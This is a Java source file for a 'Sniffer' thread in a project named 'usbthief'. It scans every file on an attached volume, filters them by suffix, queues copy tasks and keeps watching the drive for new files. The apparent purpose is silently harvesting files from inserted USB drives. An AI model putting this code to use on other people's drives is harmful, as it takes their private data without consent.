package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.Volume;
import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;
import com.superredrock.usbthief.core.filter.BasicFileFilter;
import com.superredrock.usbthief.core.filter.SuffixFilter;

import java.io.Closeable;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.BiPredicate;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.time.Duration;
import java.time.Instant;
import java.util.stream.Stream;

public class Sniffer extends Thread implements Closeable {
    protected static final Logger logger = LogManager.getLogger(Sniffer.class);

    private final Path root;
    private final WatchService monitor;
    private final Volume volume;

    private final AtomicInteger changeCount = new AtomicInteger(0);
    private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
    private volatile boolean running = true;
    private volatile SnifferPhase phase = SnifferPhase.INITIAL_SCAN;
    private volatile Instant lastResetTime = Instant.now();
    private volatile ForkJoinTask<?> currentScanTask;

    private final CompletableFuture<Void> completionFuture = new CompletableFuture<>();

    private static final ForkJoinPool scanPool = ForkJoinPool.commonPool();
    static {
        scanPool.setParallelism(16);
    }

    /**
     * Creates a Sniffer for the given volume.
     *
     * @param volume the volume to scan/monitor
     */
    public Sniffer(Volume volume) {
        super(QueueManager.getDiskScanners(), "DiskScanner: " + volume.getDriveLetter());
        this.volume = volume;
        this.root = volume.getRootPath();
        WatchService ws;
        try {
            ws = FileSystems.getDefault().newWatchService();
        } catch (IOException e) {
            logger.warn("Failed to create WatchService: ", e);
            ws = null;
        }
        this.monitor = ws;
    }

    @Override
    public void run() {
        performInitialScan();
        phase = SnifferPhase.MONITORING;
        if (Thread.currentThread().isInterrupted()) {
            completionFuture.completeExceptionally(new InterruptedException("Sniffer interrupted during initial scan"));
            return;
        }

        if (!ConfigManager.getInstance().get(ConfigSchema.WATCH_ENABLED)) {
            logger.info("File monitoring disabled, scanner finished");
            completionFuture.complete(null);
            return;
        }

        logger.info("Starting file monitoring for {}", root);

        if (monitor == null) {
            logger.warn("WatchService not available, skipping file monitoring");
        } else {
            startMonitoring();
        }
    }

    private void performInitialScan() {
        logger.info("Scanning Disk {}", root);
        BiPredicate<Path, BasicFileAttributes> fileFilter = new BasicFileFilter(ConfigManager.getInstance());
        SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());
        AtomicInteger fileCount = new AtomicInteger(0);

        ForkJoinTask<?> scan = scanPool.submit(
                () -> {
                    try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE,fileFilter).parallel()) {
                        paths.peek(path -> {
                                    if (Files.isDirectory(path)) {
                                        TaskScheduler.getInstance().submit(new CopyTask(path, volume.getSerialNumber()));
                                    };
                                })
                                .filter(Files::isRegularFile)
                                .filter(suffixFilter.asPredicate())
                                .peek(path -> {
                                    long fileSize = 0;
                                    try {fileSize = Files.size(path);} catch (IOException _) {}
                                    EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, fileSize, volume.getSerialNumber()));}
                                )
                                .forEach(path -> {
                                    if (!running || Thread.currentThread().isInterrupted()) {
                                        throw new RuntimeException("Scan stopped");
                                    }
                                    int count = fileCount.incrementAndGet();
                                    if (count % 500 == 0) {
                                        logger.info("Scan progress: {} files found on {}", count, root);
                                    }
                                    submitCopyTask(path);
                                });
                    } catch (IOException e) {
                        logger.warn("Fail",e);
                    }
                }
                );
        currentScanTask = scan;
        try {
            scan.get();
        } catch (InterruptedException | ExecutionException e) {
            scan.cancel(true);
            this.interrupt();
        } finally {
            currentScanTask = null;
        }

        logger.info("Initial scan completed for {}: {} files found", root, fileCount.get());
    }


    private void processDirectorySafely(Path dir) {
        try {
            submitCopyTask(dir);
            registerDirectoryWatch(dir);
            logger.debug("Registered directory: {}", dir);
        } catch (IOException e) {
            logger.warn("Error processing directory {}: {}", dir, e);
        }
    }


    private void submitCopyTask(Path path) {
        Callable<CopyResult> task = ConfigManager.getInstance().get(ConfigSchema.COPY_VERIFY_ENABLED)
                ? new VerifyTask(path, volume.getSerialNumber())
                : new CopyTask(path, volume.getSerialNumber());
        TaskScheduler.getInstance().submit(task);
    }

    private void scanNewDirectory(Path dir) throws IOException {
        registerDirectoryWatch(dir);

        BiPredicate<Path, BasicFileAttributes> fileFilter = new BasicFileFilter(ConfigManager.getInstance());
        BiPredicate<Path, BasicFileAttributes> filter = (path, attrs) ->
                attrs.isDirectory() || fileFilter.test(path, attrs);
        SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());

        try {
            scanPool.submit(() -> {
                try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).parallel()) {
                    paths.peek(path -> {
                                if (Files.isDirectory(path)) processDirectorySafely(path);
                            })
                            .filter(Files::isRegularFile)
                            .filter(suffixFilter.asPredicate())
                            .forEach(path -> {
                                if (!running) {
                                    throw new RuntimeException("Scan stopped");
                                }
                                long fileSize = 0;
                                try {
                                    fileSize = Files.size(path);
                                } catch (IOException e) {
                                    logger.debug("Could not get file size for {}: {}", path, e);
                                }
                                EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, fileSize, volume.getSerialNumber()));
                                submitCopyTask(path);
                            });
                } catch (IOException e) {
                    logger.warn("",e);
                }
            }).get();
        }  catch (ExecutionException | InterruptedException e) {
            logger.warn("Unknowable Exception, skip scanning {}", dir,e);
        }
    }

    private void startMonitoring() {
        Thread resetThread = getResetThread();
        resetThread.start();

        boolean hadError = false;

        try {
            while (running && !Thread.currentThread().isInterrupted()) {
                WatchKey key = monitor.take();
                Path watchPath = (Path) key.watchable();

                key.pollEvents().stream()
                    .peek(event -> {
                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
                            logger.warn("WatchEvent overflow detected");
                        }
                    })
                    .filter(event -> event.kind() != StandardWatchEventKinds.OVERFLOW)
                    .forEach(event -> handleWatchEvent(watchPath, event));

                if (!key.reset()) {
                    watchKeys.remove(watchPath);
                    if (watchKeys.isEmpty()) {
                        logger.info("All watch keys cancelled, stopping monitor");
                        break;
                    }
                }
            }
        } catch (ClosedWatchServiceException e) {
            logger.info("WatchService closed");
        } catch (InterruptedException e) {
            logger.info("Monitoring interrupted");
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            logger.error("Error in monitoring loop: ", e);
            hadError = true;
        } finally {
            phase = SnifferPhase.FINISHED;
            running = false;
            closeWatchService();
            if (hadError) {
                completionFuture.completeExceptionally(new RuntimeException("Sniffer monitoring error"));
            } else {
                completionFuture.complete(null);
            }
        }
    }

    private Thread getResetThread() {
        Thread resetThread = new Thread(() -> {
            while (running) {
                try {
                    TimeUnit.SECONDS.sleep(ConfigManager.getInstance().get(ConfigSchema.WATCH_RESET_INTERVAL_SECONDS));
                    int count = changeCount.getAndSet(0);
                    lastResetTime = Instant.now();
                    if (count > 0) {
                        logger.debug("Reset change count: {}", count);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "ChangeCounterReset");
        resetThread.setDaemon(true);
        return resetThread;
    }

    @SuppressWarnings("unchecked")
    private void handleWatchEvent(Path watchPath, WatchEvent<?> event) {
        WatchEvent.Kind<?> kind = event.kind();

        Path fullPath = watchPath.resolve(((WatchEvent<Path>) event).context());

        try {
            if (!Files.exists(fullPath) || Files.isHidden(fullPath)) {
                return;
            }
        } catch (IOException e) {
            return;
        }

        int newCount = changeCount.incrementAndGet();
        logger.debug("File event: {} on {} (count: {})", kind, fullPath, newCount);

        if (newCount >= ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD)) {
            int threshold = ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD);
            logger.info("Change threshold reached ({}), triggering copy", threshold);
            changeCount.set(0);
            handleChangedPath(fullPath, kind);
        }
    }

    private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
        try {
            if (Files.isDirectory(path) && kind == StandardWatchEventKinds.ENTRY_CREATE) {
                scanNewDirectory(path);
            } else if (Files.isRegularFile(path)) {
                submitCopyTask(path);
            }
        } catch (IOException e) {
            logger.warn("Error handling changed path: ", e);
        }
    }

    private void registerDirectoryWatch(Path dir) throws IOException {
        if (monitor == null || watchKeys.containsKey(dir)) {
            return;
        }
        WatchKey key = dir.register(monitor,
            StandardWatchEventKinds.ENTRY_CREATE,
            StandardWatchEventKinds.ENTRY_MODIFY,
            StandardWatchEventKinds.ENTRY_DELETE);
        watchKeys.put(dir, key);
        logger.debug("Registered watch for directory: {}", dir);
    }

    public int getChangeCount() {
        return changeCount.get();
    }

    public int getWatchedDirCount() {
        return watchKeys.size();
    }

    public CompletableFuture<Void> onFinish() {
        return completionFuture;
    }

    public SnifferPhase getPhase() {
        return phase;
    }

    public Instant getLastResetTime() {
        return lastResetTime;
    }

    public SnifferDebugSnapshot getDebugSnapshot() {
        ConfigManager config = ConfigManager.getInstance();
        Instant resetTime = this.lastResetTime;
        int intervalSec = config.get(ConfigSchema.WATCH_RESET_INTERVAL_SECONDS);
        long elapsedSec = Duration.between(resetTime, Instant.now()).getSeconds();
        int untilReset = Math.max(0, intervalSec - (int) elapsedSec);

        return new SnifferDebugSnapshot(
            volume.getDriveLetter(),
            volume.getSerialNumber(),
            phase,
            changeCount.get(),
            config.get(ConfigSchema.WATCH_THRESHOLD),
            untilReset,
            intervalSec,
            watchKeys.size(),
            0L,
            ""
        );
    }

    public void stopMonitoring() {
        running = false;
        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warn("Error closing WatchService: ", e);
            }
        }
    }

    private void closeWatchService() {
        watchKeys.values().parallelStream()
            .forEach(WatchKey::cancel);

        watchKeys.clear();

        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warn("Error closing WatchService: ", e);
            }
        }
    }

    @Override
    public void close() {
        running = false;

        ForkJoinTask<?> scan = currentScanTask;
        if (scan != null && !scan.isDone()) {
            scan.cancel(true);
        }

        stopMonitoring();
        this.interrupt();

        if (isAlive()) {
            try {
                join(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        if (isAlive()) {
            logger.warn("Sniffer thread did not terminate in time for: {}", root);
        }
    }
}
